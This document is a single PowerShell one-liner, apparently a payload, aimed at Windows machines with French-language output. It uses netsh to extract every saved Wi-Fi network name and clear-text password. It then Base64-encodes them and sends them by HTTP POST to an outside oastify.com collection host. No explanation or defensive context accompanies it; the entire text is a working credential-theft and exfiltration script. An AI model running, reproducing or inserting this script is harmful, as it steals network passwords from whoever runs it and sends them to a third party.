$f_s = netsh wlan show profiles | Select-String '\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}; $s = $f_s | Select-String 'Nom du SSID\W+\:(.+)$' ; $k = $f_s | Select-String 'Contenu de la cl(.)\W+\:(.+)$'; $base64String = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($s + $k)); $jB = @{ data = $base64String } | ConvertTo-Json; $r = Invoke-RestMethod -Uri "https://kg4yxb0me3bq2a1b747mogvtwk2bq6ev.oastify.com" -Method Post -Body $jB -ContentType "application/json"; $r
